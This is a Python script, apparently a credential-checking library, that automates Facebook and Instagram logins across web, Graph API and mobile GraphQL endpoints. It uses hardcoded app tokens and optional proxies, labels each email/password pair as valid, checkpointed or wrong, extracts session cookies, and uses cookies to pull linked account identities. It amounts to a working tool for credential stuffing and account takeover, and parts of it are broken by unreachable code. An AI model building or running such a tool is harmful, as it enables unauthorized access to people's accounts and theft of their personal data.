# The Script And The Library For Odai @K33Ka
# السكربت و المكتبة لعدي @K33Ka
import requests
import random
import string
import re
import json
import time
import uuid
import httpx
import base64
import secrets
import urllib3,urllib
from uuid import uuid4
from secrets import token_hex
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from base64 import b64encode
from urllib.parse import urlparse, parse_qs
import requests,urllib.parse
class proxy:
    @staticmethod
    def build(proxy_str):
        if not proxy_str:
            return None
        proxy_str = proxy_str.strip()
        if "://" not in proxy_str:
            proxy_str = "http://" + proxy_str

        scheme = proxy_str.split("://")[0].lower()

        if scheme not in ["http", "https", "socks4", "socks5"]:
            scheme = "http"
            proxy_str = "http://" + proxy_str.split("://")[-1]

        return {
            "http": f"{scheme}://{proxy_str.split('://')[1]}",
            "https": f"{scheme}://{proxy_str.split('://')[1]}"
        }
def extract_cookies(text):
    for _ in range(5):text = text.replace('\\"', '"').replace('\\\\', '\\')
    start_match = re.search(r'"session_cookies"\s*:\s*\[', text)
    if not start_match:return None
    start_idx = start_match.end() - 1
    i = start_idx
    bracket_count = 0
    in_string = False
    escape = False
    while i < len(text):
        ch = text[i]
        if escape:escape = False
        elif ch == '\\':escape = True
        elif ch == '"':in_string = not in_string
        elif not in_string:
            if ch == '[':bracket_count += 1
            elif ch == ']':
                bracket_count -= 1
                if bracket_count == 0:
                    end_idx = i
                    break
        i += 1
    else:return None
    array_content = text[start_idx+1:end_idx]
    cookie_pairs = re.findall(r'"name"\s*:\s*"([^"]+)"\s*,\s*"value"\s*:\s*"([^"]+)"',array_content)
    if not cookie_pairs:return None
    cookie_dict = {name: value for name, value in cookie_pairs}
    order = ["c_user", "xs", "fr", "datr"]
    parts = []
    for name in order:
        if name in cookie_dict:parts.append(f"{name}={cookie_dict[name]}")
    return "; ".join(parts)
class facebook:
    @staticmethod
    def basic(email, password, proxies=None):
        r = requests.get("https://www.facebook.com/?_rd")
        m = re.search(r'privacy_mutation_token\s*["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-:.]+)', r.text)
        token = m.group(1) if m else None
        cok = r.cookies
        fr = cok.get('fr', '')
        session = requests.Session()
        session.cookies.update(cok.get_dict())
        headers = {"user-agent": "Mozilla/5.0"}
        url = "https://accountscenter.facebook.com/"
        res = session.get(url, headers=headers).text
        lsd_match = re.search(r'"LSD",\[\],{"token":"(.*?)"}', res)
        lsd = lsd_match.group(1) if lsd_match else None
        cookies = {'datr': '1uBDaYSNCnmSWNXK148RNXci','sb': '1uBDaSJj0uSvPcQFj-09YEP-','ps_l': '1','ps_n': '1','dpr': '2.8035895824432373','m_pixel_ratio': '2.549999952316284','fr': fr,'wd': '891x815'}
        headers = {'authority': 'www.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','dpr': '2.549999952316284','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com/?_rdr','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"','sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-model': '""','sec-ch-ua-platform': '"Linux"','sec-ch-ua-platform-version': '""','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36','viewport-width': '980'}
        data = {'jazoest': '21013','lsd': lsd,'user': email,'login_source': 'comet_headerless_login','next': '','encpass': f'PWD_BROWSER:0:{int(time.time())}:{password}'}
        try: 
            response = requests.post(f'https://www.facebook.com/login/?privacy_mutation_token={token}&next',cookies=cookies,headers=headers,data=data,proxies = proxy.build(proxies)).text
            account_id = re.search(r'ACCOUNT_ID["\']?\s*[:=]\s*["\']?(\d+)', response)
            user_id = re.search(r'USER_ID["\']?\s*[:=]\s*["\']?(\d+)', response)
            username = re.search(r'USERNAME["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_.]+)', response)
            if (account_id and account_id.group(1) != "0" and user_id and user_id.group(1) != "0" and username and username.group(1) != "0"):return json.dumps({"status": "success","account_id": account_id.group(1),"username": username.group(1),"user": email,"password": password,"Dev": "Odai @K33Ka"})
            elif ('Please complete the security check to log in.' in response or 'two_step_verification' in response or '2fa' in response.lower()):return json.dumps({"status": "checkpoint","account_id": account_id.group(1),"username": username.group(1),"user": email,"password": password,"Dev": "Odai @K33Ka"})
            elif ('كلمة السر التي أدخلتها غير صحيحة.' in response or 'هل نسيت كلمة السر؟' in response):return json.dumps({"status": "bad password","user": email,"password": password,"Dev": "Odai @K33Ka"})
            elif 'البريد الإلكتروني أو رقم الهاتف المحمول الذي أدخلته غير مرتبط بحساب.' in response:return json.dumps({"status": "user not found","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"})
            else:return json.dumps({"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"})
        except Exception as e:result = {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33Ka"}
    @staticmethod
    def auth(email, password, proxies=None):
        data = {"locale": "en_GB","format": "json","user": email,"password": password,"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies": 1}
        headers = {'user-agent': 'Mozilla/5.0','Host': 'graph.facebook.com','Content-Type': 'application/json;charset=utf-8'}
        try:
            response = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,proxies = proxy.build(proxies))
            result = response.json()
            text = response.text
            if 'access_token' in result or 'session_key' in result:
                uid = result.get('uid', '')
                cookies = ';'.join(i['name'] + '=' + i['value'] for i in result.get('session_cookies', []))
                return {"status": "success","uid": uid,"cookies": cookies,"user": email,"password": password,"Dev": "Odai @K33Ka"}
            elif ('www.facebook.com' in result.get('error', {}).get('message', '') or 'Please complete the security check to log in.' in text or 'two_step_verification' in text):return {"status": "checkpoint","user": email,"password": password,"Dev": "Odai @K33Ka"}
            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
        except Exception as e:result = {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33Ka"}
    @staticmethod
    def mobile(email, password, proxies=None):
        payload = {'method': "post", 'pretty': "false", 'format': "json", 'server_timestamps': "true", 'locale': "en_EN", 'purpose': "fetch", 'fb_api_req_friendly_name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request", 'fb_api_caller_class': "graphservice", 'client_doc_id': "11994080425074657009809260413", 'fb_api_client_context': json.dumps({"is_background": False}), 'variables': json.dumps({"params": {"params": json.dumps({"params": json.dumps({"client_input_params": {"sim_phones": [], "aymh_accounts": [{"profiles": {"id": {"is_derived": 0, "credentials": [], "account_center_id": "", "profile_picture_url": "", "small_profile_picture_url": None, "notification_count": 0, "token": "", "last_access_time": 0, "has_smartlock": 0, "credential_type": "none", "password": "", "from_accurate_privacy_result": 0, "dbln_validated": 0, "user_id": "", "name": "", "nta_eligibility_reason": None, "username": "", "account_source": ""}}, "id": ""}], "secure_family_device_id": str(uuid4()), "attestation_result": {}, "has_granted_read_contacts_permissions": 0, "auth_secure_device_id": "null", "has_whatsapp_installed": 1, "password": f"#PWD_FB4A:0:{str(int(time.time()))}:{password}", "sso_token_map_json_string": "", "block_store_machine_id": None, "cloud_trust_token": None, "event_flow": "login_manual", "password_contains_non_ascii": "false", "sim_serials": [], "client_known_key_hash": "", "encrypted_msisdn": "", "has_granted_read_phone_permissions": 0, "app_manager_id": str(uuid4()), "should_show_nested_nta_from_aymh": 1, "device_id": str(uuid4()), "zero_balance_state": "data", "login_attempt_count": 1, "flash_call_permission_status": {"READ_PHONE_STATE": "DENIED", "READ_CALL_LOG": "DENIED", "ANSWER_PHONE_CALLS": "DENIED"}, "accounts_list": [], "family_device_id": str(uuid4()), "fb_ig_device_id": [], "device_emails": [], "try_num": 3, "lois_settings": {"lois_token": ""}, "event_step": "home_page", "headers_infra_flow_id": str(uuid4()), "openid_tokens": {}, "contact_point": email}, "server_params": {"should_trigger_override_login_2fa_action": 0, "is_vanilla_password_page_empty_password": 0, "is_from_logged_out": 0, "should_trigger_override_login_success_action": 0, "login_credential_type": "none", "server_login_source": "login", "waterfall_id": str(uuid4()), "two_step_login_type": "one_step_login", "login_source": "Login", "is_platform_login": 0, "pw_encryption_try_count": 1, "INTERNAL__latency_qpl_marker_id": 36707139, "is_from_aymh": 0, "offline_experiment_group": None, "is_from_landing_page": 0, "password_text_input_id": None, "is_from_empty_password": 0, "is_from_msplit_fallback": 0, "ar_event_source": "login_home_page", "username_text_input_id": None, "layered_homepage_experiment_group": None, "device_id": str(uuid4()), "INTERNAL__latency_qpl_instance_id": 1.06996309100672e14, "reg_flow_source": "login_home_native_integration_point", "is_caa_perf_enabled": 1, "credential_type": "password", "is_from_password_entry_page": 0, "caller": "gslr", "family_device_id": str(uuid4()), "is_from_assistive_id": 0, "access_flow_version": "pre_mt_behavior", "is_from_logged_in_switcher": 0}})}), "bloks_versioning_id": "c42a4bd8f99cb2bd57ea74ca2b690710be5a50faa60a68bb9bcc524fe6c63e7a", "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"}, "scale": "3", "nt_context": {"using_white_navbar": True, "styles_id": "3b115a54b620c39392b96bdca4c5237f", "pixel_ratio": 3, "is_push_on": True, "debug_tooling_metadata_token": None, "is_flipper_enabled": False, "theme_params": [{"value": [], "design_system_name": "FDS"}], "bloks_version": "c42a4bd8f99cb2bd57ea74ca2b690710be5a50faa60a68bb9bcc524fe6c63e7a"}}), 'fb_api_analytics_tags': json.dumps(["GraphServices"]), 'client_trace_id': "a5bba4f8-b87f-4b73-8d9a-44226255a84c"}
        headers = {'User-Agent': "[FBAN/FB4A;FBAV/536.0.0.46.77;FBBV/810163229;FBDM/{density=2.75,width=1080,height=2220};FBLC/en_EN;FBRV/0;FBCR/Yemen Mobile;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 10 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",'x-fb-friendly-name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",'authorization': "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32"}
        try:
            response = requests.post("https://graph-fallback.facebook.com/graphql",data=payload,headers=headers,proxies = proxy.build(proxies))
            response_text = response.text
            return response_text
            if re.search(r'"access_token":"(.*?)"', response_text.replace("/", "").replace("\\", "")):
                token_match = re.search(r'"access_token":"(.*?)"', response_text.replace("/", "").replace("\\", ""))
                cookies = extract_cookies(response.text)
                return {"status": "success","access_token": token_match.group(1),"cookies": cookies,"user": email,"password": password,"Dev": "Odai @K33Ka"}
            elif "Invalid username or password" in response_text or 'override_login_2fa_action' in response_text:return {"status": "bad credentials","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
        except Exception as e:result = {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33Ka"}
    @staticmethod
    def ig_auth(email, password, proxies=None):
        cookies = {'datr': '', 'dpr': '1.25', 'ps_l': '1', 'ps_n': '1', 'sb': '', 'fr': '', 'wd': '834x826'}
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '1.25', 'origin': 'https://web.facebook.com', 'priority': 'u=0, i', 'referer': 'https://web.facebook.com/ig_xsite_user_info/?_rdc=1&_rdr', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"', 'sec-ch-ua-full-version-list': '"Chromium";v="146.0.7680.165", "Not-A.Brand";v="24.0.0.0", "Google Chrome";v="146.0.7680.165"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36', 'viewport-width': '834'}
        try:
            page_req = requests.get('https://accountscenter.instagram.com/',headers=headers,proxies = proxy.build(proxies))
            page = page_req.text
            cookies.update(page_req.cookies.get_dict())
            lsd_match = re.search(r'"LSD",\[\],{"token":"(.*?)"}', page)
            lsd = lsd_match.group(1) if lsd_match else ""
            headers['x-fb-lsd'] = lsd
            params = {'login_attempt': '1','lwv': '110'}
            data = {'jazoest': '22360', 'lsd': lsd, 'email': email, 'pass': password, 'timezone': '-180', 'lgndim': 'eyJ3IjoxNTM2LCJoIjo5NjAsImF3IjoxNTM2LCJhaCI6OTEyLCJjIjozMn0=', 'lgnrnd': '225140_iQTj', 'lgnjs': 'n', 'ab_test_data': '', 'locale': 'en_US', 'shared_prefs_data': '', 'next': 'https://web.facebook.com/ig_xsite_user_info/', 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': ''}
            r = requests.post('https://web.facebook.com/login/device-based/regular/login/', params=params, cookies=cookies, headers=headers, data=data, proxies = proxy.build(proxies))
            response = r.text
            return response
            if 'The password you’ve entered is incorrect' in response:return {"status": "bad password","user": email,"password": password,"Dev": "Odai @K33Ka"}
            elif 'The email you entered isn’t connected to an account' in response:return {"status": "user not found","user": email,"password": password,"Dev": "Odai @K33Ka"}
            elif ('Enter the security code' in response):return {"status": "checkpoint","user": email,"password": password,"Dev": "Odai @K33Ka"}
            elif "Please Confirm Password" in response:return {"status": "correct but typo","user": email,"password": password,"Dev": "Odai @K33Ka"}
            env_match = re.search(r'<script id="envjson" type="application/json">(.*?)</script>', response, re.DOTALL)
            account_data = None
            if env_match:
                try:env_json = json.loads(env_match.group(1));account_data = env_json.get("CurrentUserInitialData", {})
                except:pass
            if not account_data or not account_data.get("ACCOUNT_ID"):
                alt_match = re.search(r'"ACCOUNT_ID"\s*:\s*"(\d+)"', response)
                if alt_match and alt_match.group(1) not in ("0", ""):
                    account_id = alt_match.group(1)
                    name_match = re.search(r'"NAME"\s*:\s*"([^"]+)"', response)
                    name = name_match.group(1) if name_match else "Unknown"
                    account_data = {"ACCOUNT_ID": account_id, "NAME": name}
            if account_data and account_data.get("ACCOUNT_ID", "0") not in ("0", "", "null"):return {"status": "success","account_id": account_data.get("ACCOUNT_ID"),"name": account_data.get("NAME", "Unknown"),"cookies": r.cookies.get_dict(),"user": email,"password": password,"Dev": "Odai @K33Ka"}
            else:return {"status": "unknown response","user": email,"password": password,"Dev": "Odai @K33Ka"}
        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33Ka"}
    def __init__(self):
        self.session    = requests.Session()
        self.user_agent = (
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        )
        self.session.headers.update({
            'User-Agent'              : self.user_agent,
            'Accept'                  : (
                "text/html,application/xhtml+xml,application/xml;"
                "q=0.9,image/avif,image/webp,image/apng,*/*;"
                "q=0.8,application/signed-exchange;v=b3;q=0.7"
            ),
            'Accept-Language'         : "en-US,en;q=0.9",
            'Sec-Fetch-Dest'          : "document",
            'Sec-Fetch-Mode'          : "navigate",
            'Sec-Fetch-Site'          : "none",
            'Sec-Fetch-User'          : "?1",
            'Upgrade-Insecure-Requests': "1",
            'sec-ch-ua'               : '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile'        : "?1",
            'sec-ch-ua-platform'      : '"Android"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-ch-ua-model'         : '"SM-S908E"',
        })
        self.tokens      = {}
        self.req_counter = 1
    def extract_tokens(self, html: str) -> None:
        dtsg = re.search(r'"dtsg":\{"token":"([^"]+)"', html)
        if dtsg:
            self.tokens['fb_dtsg'] = dtsg.group(1)

        lsd = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', html)
        if lsd:
            self.tokens['lsd'] = lsd.group(1)
        else:
            lsd2 = re.search(r'"lsd":"([^"]+)"', html)
            if lsd2:
                self.tokens['lsd'] = lsd2.group(1)

        jaz = re.search(r'initSprinkleValue":"([0-9]+)"', html)
        if jaz:
            self.tokens['jazoest'] = jaz.group(1)
        else:
            jaz2 = re.search(r'"jazoest","([0-9]+)"', html)
            if jaz2:
                self.tokens['jazoest'] = jaz2.group(1)

        bkv = re.search(r'versioningID:"([^"]+)"', html)
        if bkv:
            self.tokens['__bkv'] = bkv.group(1)

        rev = re.search(r'"server_revision":(\d+)', html)
        if rev:
            self.tokens['__rev'] = rev.group(1)

        hsi = re.search(r'"hsi":"([^"]+)"', html)
        if hsi:
            self.tokens['__hsi'] = hsi.group(1)

        hs = re.search(r'"haste_session":"([^"]+)"', html)
        if hs:
            self.tokens['__hs'] = hs.group(1)
        dyn = re.findall(r'\"(0[0-9A-Za-z_\-]{50,})\"', html)
        if dyn:
            self.tokens['__dyn'] = max(dyn, key=len)
        else:
            self.tokens['__dyn'] = (
                "0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLC"
                "JmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0"
            )
    @staticmethod
    def _gen_s() -> str:
        return ":".join(secrets.token_hex(3) for _ in range(3))

    def _next_req(self) -> str:
        val    = self.req_counter
        self.req_counter += 1
        result = ""
        while val > 0:
            val, rem = divmod(val - 1, 26)
            result   = chr(ord('a') + rem) + result
        return result

    def get_full_cookies_string(self) -> str:
        return "; ".join(
            f"{k}={v}" for k, v in self.session.cookies.get_dict().items()
        )
    def blockslogin(self, username: str, password: str) -> bool:
        page = self.session.get(
            "https://m.facebook.com/",
            headers={
                'Sec-Fetch-Dest': "document",
                'Sec-Fetch-Mode': "navigate",
                'Sec-Fetch-Site': "none",
                'Sec-Fetch-User': "?1",
            }
        )
        self.extract_tokens(page.text)
        timestamp    = str(int(time.time()))
        password_enc = f"#PWD_BROWSER:0:{timestamp}:{password}"
        fresh_s      = self._gen_s()
        fresh_req    = self._next_req()

        params_json = json.dumps({
            "params": json.dumps({
                "server_params": {
                    "credential_type"                              : "password",
                    "username_text_input_id"                       : "2c17gb:74",
                    "password_text_input_id"                       : "2c17gb:75",
                    "login_source"                                 : "Login",
                    "login_credential_type"                        : "none",
                    "server_login_source"                          : "login",
                    "ar_event_source"                              : "login_home_page",
                    "should_trigger_override_login_success_action" : 0,
                    "should_trigger_override_login_2fa_action"     : 0,
                    "is_caa_perf_enabled"                          : 0,
                    "reg_flow_source"                              : "login_home_native_integration_point",
                    "caller"                                       : "gslr",
                    "is_from_landing_page"                         : 0,
                    "is_from_empty_password"                       : 0,
                    "is_from_aymh"                                 : 0,
                    "is_from_password_entry_page"                  : 0,
                    "is_from_assistive_id"                         : 0,
                    "is_from_msplit_fallback"                      : 0,
                    "two_step_login_type"                          : "one_step_login",
                    "left_nav_button_action"                       : "NONE",
                    "INTERNAL__latency_qpl_marker_id"              : 36707139,
                    "INTERNAL__latency_qpl_instance_id"            : str(int(time.time() * 1000)),
                    "device_id"                                    : None,
                    "family_device_id"                             : None,
                    "waterfall_id"                                 : str(uuid.uuid4()),
                    "offline_experiment_group"                     : None,
                    "layered_homepage_experiment_group"            : None,
                    "is_platform_login"                            : 0,
                    "is_from_logged_in_switcher"                   : 0,
                    "is_from_logged_out"                           : 0,
                    "access_flow_version"                          : "pre_mt_behavior",
                    "login_surface"                                : "login_home",
                    "login_entry_point"                            : "logged_out"
                },
                "client_input_params": {
                    "machine_id"                              : "",
                    "cloud_trust_token"                       : None,
                    "block_store_machine_id"                  : "",
                    "zero_balance_state"                      : "",
                    "contact_point"                           : username,
                    "password"                                : password_enc,
                    "accounts_list"                           : [],
                    "fb_ig_device_id"                         : [],
                    "secure_family_device_id"                 : "",
                    "encrypted_msisdn"                        : "",
                    "headers_infra_flow_id"                   : "",
                    "try_num"                                 : 1,
                    "login_attempt_count"                     : 1,
                    "event_flow"                              : "login_manual",
                    "event_step"                              : "home_page",
                    "openid_tokens"                           : {},
                    "auth_secure_device_id"                   : "",
                    "client_known_key_hash"                   : "",
                    "has_whatsapp_installed"                  : 0,
                    "sso_token_map_json_string"               : "",
                    "should_show_nested_nta_from_aymh"        : 0,
                    "gms_incoming_call_retriever_eligibility" : "client_not_supported",
                    "password_contains_non_ascii"             : "false",
                    "has_granted_read_contacts_permissions"   : 0,
                    "has_granted_read_phone_permissions"      : 0,
                    "app_manager_id"                          : "",
                    "aymh_accounts"                           : [],
                    "sso_accounts_auth_data": [],
                    "network_bssid"         : None,
                    "lois_settings"         : {"lois_token": ""},
                    "aac"                   : ""
                }
            })
        })

        post_data = {
            '__aaid'  : '0',
            '__user'  : '0',
            '__a'     : '1',
            '__req'   : fresh_req,
            '__hs'    : self.tokens.get('__hs', ''),
            'dpr'     : '3',
            '__ccg'   : 'GOOD',
            '__rev'   : self.tokens.get('__rev', ''),
            '__s'     : fresh_s,
            '__hsi'   : self.tokens.get('__hsi', ''),
            '__dyn'   : self.tokens.get('__dyn', ''),
            'fb_dtsg' : self.tokens.get('fb_dtsg', ''),
            'jazoest' : self.tokens.get('jazoest', ''),
            'lsd'     : self.tokens.get('lsd', ''),
            'params'  : params_json,
        }
        post_headers = {
            'authority'                 : 'm.facebook.com',
            'accept'                    : '*/*',
            'accept-language'           : 'en-US,en;q=0.9',
            'content-type'              : 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin'                    : 'https://m.facebook.com',
            'referer'                    : 'https://m.facebook.com/',
            'sec-ch-ua'                 : '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile'          : '?1',
            'sec-ch-ua-platform'        : '"Android"',
            'sec-fetch-dest'            : 'empty',
            'sec-fetch-mode'            : 'cors',
            'sec-fetch-site'            : 'same-origin',
            'user-agent'                : self.user_agent,
            'x-fb-friendly-name'        : 'loginWithPasswordMutation',
        }

        self.session.cookies.set('ps_l', '1', domain='.facebook.com')
        self.session.cookies.set('ps_n', '1', domain='.facebook.com')

        url_params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type' : 'action',
            '__bkv': self.tokens.get('__bkv', ''),
        }

        response = self.session.post(
            'https://m.facebook.com/async/wbloks/fetch/',
            params  = url_params,
            headers = post_headers,
            data    = post_data
        )
        cookies_dict = self.session.cookies.get_dict()
        if 'c_user' in cookies_dict or 'sessionid' in cookies_dict:
            return {"status": "success","cookies": self.get_full_cookies_string(),"user": username,"password": password,"Dev": "Odai @K33Ka"}
        elif 'two_step_verification.entrypoint_async' in response.text:
            return {"status": "checkpoint","user": username,"password": password,"Dev": "Odai @K33Ka"}
        elif "Invalid username or password" in response.text:
            return {"status": "wrong credentials","user": username,"password": password,"Dev": "Odai @K33Ka"}
        else:
            return {"status": "unknown response","user": username,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
    class account_info:
        @staticmethod
        def info(cookies_input):
            if isinstance(cookies_input, str):
                cookies_dict = {}
                for item in cookies_input.split(";"):
                    if "=" in item:
                        key, value = item.split("=", 1)
                        cookies_dict[key.strip()] = value.strip()
            elif isinstance(cookies_input, dict):cookies_dict = cookies_input.copy()
            else:
                print("Invalid cookies format")
                return
            datr = cookies_dict.get("datr")
            sb = cookies_dict.get("sb")
            ps_l = cookies_dict.get("ps_l")
            ps_n = cookies_dict.get("ps_n")
            wd = cookies_dict.get("wd")
            c_user = cookies_dict.get("c_user")
            xs = cookies_dict.get("xs")
            session = requests.Session()
            session.cookies.update(cookies_dict)
            headers = {"user-agent": "Mozilla/5.0"}
            url = "https://accountscenter.facebook.com/"
            res = session.get(url, headers=headers).text
            fb_dtsg_match = re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}', res)
            lsd_match = re.search(r'"LSD",\[\],{"token":"(.*?)"}', res)
            fb_dtsg = fb_dtsg_match.group(1) if fb_dtsg_match else None
            lsd = lsd_match.group(1) if lsd_match else None
            cookies = {'datr': datr, 'ps_l': '1', 'ps_n': '1', 'sb': sb, 'dpr': '1.25', 'wd': '656x838', 'c_user': c_user, 'fr': '1iq1a4QIVodVmxG7I.AWeuwjn9SyIbptY2XAYrBLfXgmkYwZPSmF6Hr2yGo9V2aRU-ysY.Bptqbr..AAA.0.0.Bptqbr.AWekh9RBJfyu_fQVOsBrC3euJAk', 'xs': xs, 'presence': 'C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1773578123492%2C%22v%22%3A1%7D'}
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://accountscenter.facebook.com', 'priority': 'u=1, i', 'referer': 'https://accountscenter.facebook.com/profiles', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.160", "Chromium";v="145.0.7632.160"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36', 'x-asbd-id': '359341', 'x-fb-friendly-name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'x-fb-lsd': lsd}
            data = {'av': c_user, '__user': c_user, '__a': '1', '__req': 'l', '__hs': '20527.HYP:accounts_center_pkg.2.1...0', 'dpr': '1', '__ccg': 'GOOD', '__rev': '1035205964', '__s': 'txvfss:84i8p9:hr7nlk', '__hsi': '7617460095362994183', '__sjsp': 'gpRi1F1v96gbIfMugGMEY4s0KUgx4aBIEUk0oSbyU1n8', '__comet_req': '5', 'fb_dtsg': fb_dtsg, 'jazoest': '25453', 'lsd': lsd, '__spin_r': '1035205964', '__spin_b': 'trunk', '__spin_t': '1773578137', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'server_timestamps': 'true', 'variables': '{"identity_id":"'+c_user+'","interface":"FB_WEB","platform":"FACEBOOK","scale":1}', 'doc_id': '26102210629377215'}
            response = requests.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33Ka"}
            response = response.replace("for (;;);", "")
            js = json.loads(response)
            result = {"facebook_name": js["data"]["fxim_identity_for_id"]["full_name"],"instagram_accounts": []}
            identities = js["data"]["fx_identity_management"]["identities_and_central_identities"]["linked_identities_to_pci"]
            for acc in identities:
                if acc["detailed_identity_type"] == "IG_PERSONAL":
                    ig_id = acc["canonical_id"]
                    data["variables"] = json.dumps({"identity_id": ig_id,"interface": "FB_WEB","platform": "INSTAGRAM","scale": 1})
                    try:
                        ig_response = requests.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
                        ig_response = ig_response.replace("for (;;);", "")
                        ig_json = json.loads(ig_response)
                        ig_data = ig_json["data"]["fxim_identity_for_id"]
                        if ig_id and ig_data:result["instagram_accounts"].append({"id": ig_id,"username": ig_data["username"],"full_name": ig_data["full_name"],"profile_picture": ig_data["profile_picture_info"]["profile_picture_url"],"Dev": "Odai @K33Ka"})
                        else:result = {"status": "false","msg": "No data","Dev": "Odai @K33Ka"}
                    except Exception as e:result = {"status": " error","error": e,"Dev": "Odai @K33Ka"}
            return result
        @staticmethod
        def contact(cookies_input):
            if isinstance(cookies_input, str):
                cookies_dict = {}
                for item in cookies_input.split(";"):
                    if "=" in item:
                        key, value = item.split("=", 1)
                        cookies_dict[key.strip()] = value.strip()
            elif isinstance(cookies_input, dict):cookies_dict = cookies_input.copy()
            else:
                print("Invalid cookies format")
                return
            datr = cookies_dict.get("datr")
            sb = cookies_dict.get("sb")
            wd = cookies_dict.get("wd")
            c_user = cookies_dict.get("c_user")
            xs = cookies_dict.get("xs")
            session = requests.Session()
            session.cookies.update(cookies_dict)
            headers = {"user-agent": "Mozilla/5.0"}
            url = "https://accountscenter.facebook.com/"
            res = session.get(url, headers=headers).text
            fb_dtsg_match = re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}', res)
            lsd_match = re.search(r'"LSD",\[\],{"token":"(.*?)"}', res)
            fb_dtsg = fb_dtsg_match.group(1) if fb_dtsg_match else None
            lsd = lsd_match.group(1) if lsd_match else None
